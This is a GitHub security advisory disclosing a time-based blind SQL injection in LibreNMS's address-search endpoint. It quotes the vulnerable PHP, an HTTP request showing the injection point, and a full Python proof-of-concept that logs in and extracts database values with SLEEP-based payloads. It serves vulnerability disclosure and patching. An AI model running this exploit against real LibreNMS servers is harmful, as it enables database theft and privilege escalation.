# [H] LibreNMS has a Time-Based Blind SQL Injection in address-search.inc.php

## Summary
Severity: High
Advisory: GHSA-79q9-wc6p-cf92
CVE: CVE-2026-26990
CWE: CWE-89
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-02-18
Source: https://github.com/advisories/GHSA-79q9-wc6p-cf92
Type: github-advisory

## Affected
- Packagist: `librenms/librenms` — affected >=0 <26.2.0

## Details
### Summary
A time-based blind SQL injection vulnerability exists in `address-search.inc.php` via the `address` parameter. When a crafted subnet prefix is supplied, the prefix value is concatenated directly into an SQL query without proper parameter binding, allowing an attacker to manipulate query logic and infer database information through time-based conditional responses.


### Details
This vulnerability requires authentication and is exploitable by any authenticated user.

The vulnerable endpoint is at `/ajax_table.php` with the following request displaying the injection point.
```
POST /ajax_table.php HTTP/1.1
Host: 192.168.236.131
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.236.131
Connection: keep-alive
Referer: http://192.168.236.131/search
Cookie: laravel_session=[Authenticated user cookie]

current=1&rowCount=55&sort%5Bhostname%5D=asc&searchPhrase=&id=address-search&search_type=ipv4&device_id=1&interface=&address=127.0.0.1/aa<injected SQL here>
```

Within `includes/html/table/address-search.inc.php`, the user-controlled `$prefix` variable derived from the `address` parameter is concatenated directly into the SQL query without sanitization or parameter binding on lines 34 and 52.

```php
// Lines 16-35, 51-53
$address = $vars['address'] ?? '';
$prefix = '';
$sort = trim((string) $sort);

if (str_contains($address, '/')) {
    [$address, $prefix] = explode('/', $address, 2);
}

if ($search_type == 'ipv4') {
    $sql = ' FROM `ipv4_addresses` AS A, `ports` AS I, `devices` AS D';
    $sql .= ' WHERE I.port_id = A.port_id AND I.device_id = D.device_id ' . $where . ' ';

    if (! empty($address)) {
        $sql .= ' AND ipv4_address LIKE ?';
        $param[] = "%$address%";
    }

    if (! empty($prefix)) {
        $sql .= " AND ipv4_prefixlen='$prefix'";
    }

......

    if (! empty($prefix)) {
        $sql .= " AND ipv6_prefixlen = '$prefix'";
    }
```


### PoC
The following Python script exploits the time-based blind SQL injection vulnerability to retrieve the value of `SELECT CURRENT_USER()` from the database:
```python
#!/usr/bin/python3

import requests
import sys
import re

from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# Configured to be used with burpsuite on the default burpsuite port of 8080
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

# When None is returned it means that all values have been retrieved from the queried value in the target DB
def blind_binsearch_sqli(inj_str):
    try:
        a = range(32,126)
        start = 0
        end = len(a)
        while start <= end:
            mid = (start + end) // 2
            target_equal = inj_str.replace("[CHAR]", str(a[mid]))
            target_less = inj_str.replace("=[CHAR]", f"<{a[mid]}")

            # Return ascii decimal value for storing to a local string buffer
            if condition(target_equal):
                return a[mid]
            # Use lower half of the "a" array
            elif condition(target_less):
                end = mid - 1
            # Use upper half of the "a" array
            else:
                start = mid + 1
        return None
    except IndexError:
        return None


# Check injection result
def condition(payload):
    exploit_data = {
    "current": "1",
    "rowCount": "50",
    "sort[hostname]": "asc",
    "searchPhrase": "",
    "id": "address-search",
    "search_type": "ipv4",
    "device_id": "1",
    "interface": "",
    "address": f"127.0.0.1/aa{payload}"
    }
    # Payload must be slotted in somewhere in this code
    payload_url = f"{url}/ajax_table.php"

    r = s.post(payload_url, data=exploit_data)

    elapsed_time_seconds = r.elapsed.total_seconds()

    # If response time is within sleep function delay range of +1 or -1 second the query returned "true"
    if (elapsed_time_seconds + 1) > (sleep_delay * 2) and (elapsed_time_seconds - 1) < (sleep_delay * 2):
        return True
    else:
        return False


def get_length(inj):
    length = 0
    print(f"(+) Getting the length of \"{inj}\"")
    while True:
        # MySQL
        #length_injection_string = f" AND LENGTH(({inj}))={str(length)}-- -"
        length_injection_string = f"' AND (SELECT 1 FROM (SELECT IF(LENGTH(({inj}))={str(length)},SLEEP({sleep_delay}),0))x) AND '1'='1"

        bool_value = condition(length_injection_string)

        if bool_value == False:
            length += 1
        else:
            return length


def injection(inject_qry):
    extracted = ""
    length = get_length(inject_qry)
    print(f"Length of \"{inject_qry}\": {length}")
    print(f"(+) Retrieving the value for \"{inject_qry}\"")

    # +2 to length in order to automatically stop the injection once the None value is returned, meaning that the whole query value is extracted
    for i in range(1, length + 2):
        # MySQL
        injection_string = f"' AND (SELECT 1 FROM (SELECT IF(ASCII(SUBSTRING(({inject_qry}),{i},1))=[CHAR],SLEEP({sleep_delay}),0))x) AND '1'='1"

        retrieved_value = blind_binsearch_sqli(injection_string)

        if retrieved_value:
            extracted += chr(retrieved_value)
            extracted_char = chr(retrieved_value)
            print(extracted_char, flush=True, end="")
        elif retrieved_value == None:
            print("\n(+) done!\n")
            return extracted

global url
global s
global sleep_delay
global username
global password

# Default sleep delay, due to injection query used the response time will be sleep_delay * 2
sleep_delay = 1.5

s = requests.Session()

# HTTPS
s.verify = False

# Toggle debug proxy
#s.proxies.update(proxies)

url = "http://192.168.236.131"

username = "tester2"
password = "Adminbazinga"

if len(sys.argv) > 1:
    url = sys.argv[1]
if len(sys.argv) > 2:
    username = sys.argv[2]
if len(sys.argv) > 3:
    password = sys.argv[3]
if len(sys.argv) > 4:
    sleep_delay = float(sys.argv[4])

r = s.get(url + "/login")

login_token = re.search(r"name=\"_token\"\s+value=\"([^\"]+)\"", r.text).group(1)

login_data = {
"_token": login_token,
"username": username,
"password": password,
"submit": ""
}

r = s.post(url + "/login", data=login_data)

# Example: python3 script.py http://127.0.0.1 username password 1.5
if __name__ == "__main__":
    injection("SELECT CURRENT_USER()")
```

Tester user role:
<img width="771" height="154" alt="image" src="https://github.com/user-attachments/assets/fe13754c-9a41-48cb-934d-575097675c13" />


Example usage of PoC script:
<img width="924" height="104" alt="image" src="https://github.com/user-attachments/assets/6b1e19a9-4c73-4e44-8e16-851ff92d5960" />


### Impact
* Any authenticated user can exploit this vulnerability to extract sensitive information from the back-end database using time‑based blind SQL injection techniques.
* This leads to unauthorised disclosure of database contents, including schema information and potentially sensitive application data.
* An attacker can retrieve privileged accounts (e.g. administrative usernames) and their associated password hashes, potentially leading to privilege escalation within LibreNMS by cracking the password hashes and obtaining plaintext admin user credentials.

## References
- https://github.com/librenms/librenms/security/advisories/GHSA-79q9-wc6p-cf92
- https://github.com/librenms/librenms/pull/18777
- https://github.com/librenms/librenms/commit/15429580baba03ed1dd377bada1bde4b7a1175a1
- https://github.com/librenms/librenms
